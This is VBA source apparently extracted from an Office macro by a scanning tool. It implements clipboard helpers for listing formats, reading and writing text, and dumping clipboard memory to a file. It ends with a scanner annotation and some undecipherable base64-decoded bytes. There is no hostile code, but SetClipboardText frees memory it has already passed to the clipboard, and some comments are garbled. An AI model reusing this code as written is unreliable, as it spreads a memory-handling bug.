Private Const CF_DIBV5 = 17    'A memory object containing a BITMAPV5HEADER structure followed by the bitmap color space information and the bitmap bits.
Private Const CF_DSPBITMAP = &H82    'Bitmap display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in bitmap format in lieu of the privately formatted data.
Private Const CF_DSPENHMETAFILE = &H8E  'Enhanced metafile display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in enhanced metafile format in lieu of the privately formatted data.
Private Const CF_DSPMETAFILEPICT = &H83    'Metafile-picture display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in metafile-picture format in lieu of the privately formatted data.
Private Const CF_DSPTEXT = &H81    'Text display format associated with a private format. The hMem parameter must be a handle to data that can be displayed in text format in lieu of the privately formatted data.
Private Const CF_GDIOBJFIRST = &H300    'Start of a range of integer values for application-defined GDI object clipboard formats. The end of the range is CF_GDIOBJLAST.
Private Const CF_GDIOBJLAST = &H3FF    'See CF_GDIOBJFIRST.
Private Const CF_OWNERDISPLAY = &H80    'Owner-display format. The clipboard owner must display and update the clipboard viewer window, and receive the WM_ASKCBFORMATNAME, WM_HSCROLLCLIPBOARD, WM_PAINTCLIPBOARD, WM_SIZECLIPBOARD, and WM_VSCROLLCLIPBOARD messages. The hMem parameter must be NULL.
Private Const CF_PRIVATEFIRST = &H200    'Start of a range of integer values for private clipboard formats. The range ends with CF_PRIVATELAST. Handles associated with private clipboard formats are not freed automatically; the clipboard owner must free such handles, typically in response to the WM_DESTROYCLIPBOARD message.
Private Const CF_PRIVATELAST = &H2FF    'See CF_PRIVATEFIRST.

Public Property Get ClipboardFormatsAvailable() As Collection

    On Error GoTo ErrorHandler
    Dim thisClipboardFormat As Long
    Dim returnStringLength As Long
    Dim myCFAvailable As New Collection
    Dim clipBoardFormatName As String
    Dim ClipboardFormat As vbaClipboardFormat
    Dim success As Boolean

    success = OpenClipboard(0)

    If success Then
        thisClipboardFormat = 0
        thisClipboardFormat = EnumClipboardFormats(thisClipboardFormat)

        While thisClipboardFormat <> 0
            Set ClipboardFormat = New vbaClipboardFormat
            clipBoardFormatName = String$(NAME_MAX_LENGTH, vbNullChar)
            returnStringLength = GetClipboardFormatName(thisClipboardFormat, clipBoardFormatName, Len(clipBoardFormatName))
            clipBoardFormatName = TrimNull(clipBoardFormatName)
            If clipBoardFormatName = "" Then
                clipBoardFormatName = BuiltInClipboardFormatName(thisClipboardFormat)
            End If

            ClipboardFormat.name = clipBoardFormatName
            ClipboardFormat.Number = thisClipboardFormat
            myCFAvailable.Add ClipboardFormat, ClipboardFormat.name
            thisClipboardFormat = EnumClipboardFormats(thisClipboardFormat)
        Wend

        Set ClipboardFormatsAvailable = myCFAvailable
        CloseClipboard
    Else
        Set ClipboardFormatsAvailable = Nothing
    End If

    Exit Property

ErrorHandler:
    On Error Resume Next
    CloseClipboard
End Property

Public Function GetClipboardText(ByVal aClipboardFormatNumber As Long) As String
    'Do not handle errors - let them bubble up
    #If VBA7 Then
        Dim wLen As Integer, hMemory As LongPtr, hMyMemory As LongPtr, lpMemory As LongPtr, lpMyMemory As LongPtr
        Dim RetVal As Variant, haveMemoryLocked As Boolean, wClipAvail As Integer, szText As String, wSize As Long
    #Else
        Dim wLen As Integer, hMemory As Long, hMyMemory As Long, lpMemory As Long, lpMyMemory As Long
        Dim RetVal As Variant, haveMemoryLocked As Boolean, wClipAvail As Integer, szText As String, wSize As Long
    #End If

    Dim clipBoardText As String: clipBoardText = ""

    'Before accessing the clipboard, find out if the requested format is available
    If IsClipboardFormatAvailable(aClipboardFormatNumber) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Requested clipboard format number " & aClipboardFormatNumber & " is not available on the clipboard."
        Exit Function
    End If

    Dim success As Boolean
    success = OpenClipboard(0)

    If success Then
        'Get a handle to a memory structure containing the clipboard data in the requested format
        hMemory = GetClipBoardData(aClipboardFormatNumber)
        CloseClipboard
        'If the handle is null, something went wrong
        If hMemory = APINULL Then
            'Throw an error
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to retrieve data from the Clipboard."
        End If

        wSize = GlobalSize(hMemory)    'The handle is good. How much data came back?

        clipBoardText = Space(wSize)    'Fill our destination string with nulls

        'Lock the memory
        'Get a pointer to the locked memory area
        lpMemory = GlobalLock(hMemory)

        If lpMemory = APINULL Then
            'CloseClipboard
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to lock clipboard memory."
        End If

        RetVal = lstrcpy(clipBoardText, lpMemory)     ' Copy the locked memory into our string
        GlobalUnlock hMemory    'Unlock memory

        ' Get rid of trailing stuff.
        clipBoardText = Trim(clipBoardText)
        GetClipboardText = TrimNull(clipBoardText)
    Else
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to open Clipboard. Perhaps some other application is using it."
    End If
End Function


Public Sub SetClipboardText(ByVal aText As String, ByVal aClipboardFormatName As String)
    #If VBA7 Then
        Dim wLen As Integer, hMemory As LongPtr, lpMemory As LongPtr, RetVal As Variant, memoryIsLocked As Boolean, memoryIsAllocated As Boolean, clipBoardIsOpen As Boolean
    #Else
        Dim wLen As Integer, hMemory As Long, lpMemory As Long, RetVal As Variant, memoryIsLocked As Boolean, memoryIsAllocated As Boolean, clipBoardIsOpen As Boolean
    #End If
    memoryIsAllocated = False: memoryIsLocked = False: clipBoardIsOpen = False
    On Error GoTo ErrorHandler

    wLen = Len(aText) + 1    ' Get the length, including one extra for a CHR$(0) at the end.
    aText = aText & Chr$(0)    'Add a null to the end
    hMemory = GlobalAlloc(GHND, wLen + 1)    'Allocate some memory

    If hMemory = APINULL Then
        Err.Raise vbObjectError + 1001, "vbaClipboard", "Unable to allocate memory."
    Else
        memoryIsAllocated = True
    End If

    lpMemory = GlobalLock(hMemory)
    If lpMemory = APINULL Then    'Throw an error
        Err.Raise vbObjectError + 1001, "vbaClipboard", "Unable to lock memory."
    Else
        memoryIsLocked = True
    End If


    RetVal = lstrcpy(lpMemory, aText)    ' Copy our string into the locked memory.
    RetVal = GlobalUnlock(hMemory)    ' Don't send clipboard locked memory.

    'If the preceding throws an error, it will be handled in ErrorHandler
    memoryIsLocked = True
    If OpenClipboard(0&) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to open Clipboard. Perhaps some other application is using it."
    Else
        clipBoardIsOpen = True
    End If

    'Is the requested format one of the Windows built-in formats?
    Dim i As Integer, thisClipboardFormatNumber As Long
    thisClipboardFormatNumber = BuiltInClipboardFormatNumber(aClipboardFormatName)

    If thisClipboardFormatNumber = 0 Then
        'Nope. Register the format
        On Error Resume Next
        thisClipboardFormatNumber = RegisterClipboardFormat(aClipboardFormatName)
        If Err.Number <> 0 Then
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to register clipboard format: " & aClipboardFormatName & ". Error message: " & Err.Description
        End If
        On Error GoTo ErrorHandler

        If thisClipboardFormatNumber = 0 Then
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to register clipboard format: " & aClipboardFormatName
        End If
    End If

    'Empty the clipboard
    If EmptyClipboard() = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to empty the clipboard."
    End If

    If SetClipboardData(thisClipboardFormatNumber, hMemory) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to set the clipboard data."
    End If

    CloseClipboard
    GlobalFree hMemory
    Exit Sub

ErrorHandler:

    Dim Description As String
    Description = Err.Description
    On Error Resume Next
    If memoryIsLocked Then GlobalUnlock hMemory
    If memoryIsAllocated Then GlobalFree hMemory
    If clipBoardIsOpen Then CloseClipboard
    On Error GoTo 0

    Err.Raise vbObjectError + 1, "vbaClipboard", Description
End Sub

Private Function TrimNull(ByVal aString As String) As String
    Dim nullAt As Long
    nullAt = InStr(1, aString, vbNullChar)
    If nullAt > 0 Then
        TrimNull = Left(aString, nullAt - 1)
    Else
        TrimNull = aString
    End If
End Function

Private Function BuiltInClipboardFormatNumber(ByVal aClipboardFormatName As String) As Long
    Dim Result As Long
    Select Case UCase(aClipboardFormatName)
        Case "CF_TEXT": Result = 1
        Case "CF_BITMAP": Result = 2
        Case "CF_METAFILEPICT": Result = 3
        Case "CF_SYLK": Result = 4
        Case "CF_DIF": Result = 5
        Case "CF_TIFF": Result = 6
        Case "CF_OEMTEXT": Result = 7
        Case "CF_DIB": Result = 8
        Case "CF_PALETTE": Result = 9
        Case "CF_PENDATA": Result = 10
        Case "CF_RIFF": Result = 11
        Case "CF_WAVE": Result = 12
        Case "CF_UNICODETEXT": Result = 13
        Case "CF_ENHMETAFILE": Result = 14
        Case "CF_HDROP": Result = 15
        Case "CF_LOCALE": Result = 16
        Case "CF_DIBV5": Result = 17
        Case "CF_DSPBITMAP": Result = &H82
        Case "CF_DSPENHMETAFILE": Result = &H8E
        Case "CF_DSPMETAFILEPICT": Result = &H83
        Case "CF_DSPTEXT": Result = &H81
        Case "CF_GDIOBJFIRST": Result = &H300
        Case "CF_GDIOBJLAST": Result = &H3FF
        Case "CF_OWNERDISPLAY": Result = &H80
        Case "CF_PRIVATEFIRST": Result = &H200
        Case "CF_PRIVATELAST": Result = &H2FF
        Case Else: Result = 0
    End Select
    BuiltInClipboardFormatNumber = Result
End Function

Private Function BuiltInClipboardFormatName(ByVal aIndex As Integer) As String
    Select Case aIndex
        Case 1: BuiltInClipboardFormatName = "CF_TEXT"
        Case 2: BuiltInClipboardFormatName = "CF_BITMAP"
        Case 3: BuiltInClipboardFormatName = "CF_METAFILEPICT"
        Case 4: BuiltInClipboardFormatName = "CF_SYLK"
        Case 5: BuiltInClipboardFormatName = "CF_DIF"
        Case 6: BuiltInClipboardFormatName = "CF_TIFF"
        Case 7: BuiltInClipboardFormatName = "CF_OEMTEXT"
        Case 8: BuiltInClipboardFormatName = "CF_DIB"
        Case 9: BuiltInClipboardFormatName = "CF_PALETTE"
        Case 10: BuiltInClipboardFormatName = "CF_PENDATA"
        Case 11: BuiltInClipboardFormatName = "CF_RIFF"
        Case 12: BuiltInClipboardFormatName = "CF_WAVE"
        Case 13: BuiltInClipboardFormatName = "CF_UNICODETEXT"
        Case 14: BuiltInClipboardFormatName = "CF_ENHMETAFILE"
        Case 15: BuiltInClipboardFormatName = "CF_HDROP"
        Case 16: BuiltInClipboardFormatName = "CF_LOCALE"
        Case 17: BuiltInClipboardFormatName = "CF_DIBV5"
        Case &H82: BuiltInClipboardFormatName = "CF_DSPBITMAP"
        Case &H8E: BuiltInClipboardFormatName = "CF_DSPENHMETAFILE"
        Case &H83: BuiltInClipboardFormatName = "CF_DSPMETAFILEPICT"
        Case &H81: BuiltInClipboardFormatName = "CF_DSPTEXT"
        Case &H300: BuiltInClipboardFormatName = "CF_GDIOBJFIRST"
        Case &H3FF: BuiltInClipboardFormatName = "CF_GDIOBJLAST"
        Case &H80: BuiltInClipboardFormatName = "CF_OWNERDISPLAY"
        Case &H200: BuiltInClipboardFormatName = "CF_PRIVATEFIRST"
        Case &H2FF: BuiltInClipboardFormatName = "CF_PRIVATELAST"
    End Select
End Function


' =================
Public Function SaveClipboardToFile(ByVal aClipboardFormatNumber As Long, ByVal filename As String) As Boolean
    'Do not handle errors - let them bubble up
    #If VBA7 Then
        Dim wLen As Integer, hMemory As LongPtr, hMyMemory As LongPtr, lpMemory As LongPtr, lpMyMemory As LongPtr, hFile As LongPtr
        Dim RetVal As Variant, haveMemoryLocked As Boolean, wClipAvail As Integer, szText As String, wSize As Long
    #Else
        Dim wLen As Integer, hMemory As Long, hMyMemory As Long, lpMemory As Long, lpMyMemory As Long, hFile As Long
        Dim RetVal As Variant, haveMemoryLocked As Boolean, wClipAvail As Integer, szText As String, wSize As Long
    #End If

    Dim clipBoardText As String: clipBoardText = ""

    'Before accessing the clipboard, find out if the requested format is available
    If IsClipboardFormatAvailable(aClipboardFormatNumber) = APINULL Then
        Err.Raise vbObjectError + 1, "vbaClipboard", "Requested clipboard format number " & aClipboardFormatNumber & " is not available on the clipboard."
        Exit Function
    End If

    Dim success As Boolean
    success = OpenClipboard(0)

    If success Then
        'Get a handle to a memory structure containing the clipboard data in the requested format
        hMemory = GetClipBoardData(aClipboardFormatNumber)
        CloseClipboard
        'If the handle is null, something went wrong
        If hMemory = APINULL Then
            'Throw an error
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to retrieve data from the Clipboard."
        End If

        wSize = GlobalSize(hMemory)    'The handle is good. How much data came back?

        clipBoardText = String$(wSize, 0)   'Fill our destination string with nulls

        'Lock the memory
        'Get a pointer to the locked memory area
        lpMemory = GlobalLock(hMemory)

        If lpMemory = APINULL Then
            'CloseClipboard
            Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to lock clipboard memory."
        End If
        RetVal = lstrcpy(clipBoardText, lpMemory)     ' Copy the locked memory into our string

        hFile = CreateFileW(StrPtr(filename), GENERIC_WRITE, 0, ByVal 0&, CREATE_ALWAYS, 0, 0)
        WriteFile hFile, ByVal lpMemory, wSize, 0, ByVal 0&
        CloseHandle hFile


        GlobalUnlock hMemory    'Unlock memory

        ' Get rid of trailing stuff.
        'clipBoardText = Trim(clipBoardText)

        '        Dim FSO As Object, ts As Object
        '        Set FSO = CreateObject("scripting.filesystemobject")
        '        Set ts = FSO.CreateTextFile(filename, True)
        '        ts.Write clipBoardText
        '        ts.Close
        '        Set ts = Nothing: Set FSO = Nothing

        '        Dim FileNumber
        '        FileNumber = FreeFile    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
        '        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        '        Open filename For Binary Access Write As #FileNumber
        '        Write #FileNumber, "|fffd||fffd||fffd||fffd||fffd||fffd| hakjdhaksjdhdj " 'clipBoardText
        '        Close #FileNumber    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|

        SaveClipboardToFile = RetVal
    Else
        Err.Raise vbObjectError + 1, "vbaClipboard", "Unable to open Clipboard. Perhaps some other application is using it."
    End If
End Function
Attribute VB_Name = "vbaClipboardFormat"
Attribute VB_Base = "0{FCFB3D2A-A0FA-1068-A738-08002B3371B5}"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Attribute VB_TemplateDerived = False
Attribute VB_Customizable = False
Option Explicit

Private mNumber As Long
Private mName As String

Public Property Get Number() As Long
  Number = mNumber
End Property
Public Property Let Number(ByVal Value As Long)
  mNumber = Value
End Property

Public Property Get name() As String
  name = mName
End Property
Public Property Let name(ByVal Value As String)
  mName = Value
End Property






' InQuest injected base64 decoded content
' jZ 	
' "{-jYT
' Z+>'-
' *'~*
' "{-jYKj
' r>'-
' '.n'
' N|Z.

INQUEST-PP=macro
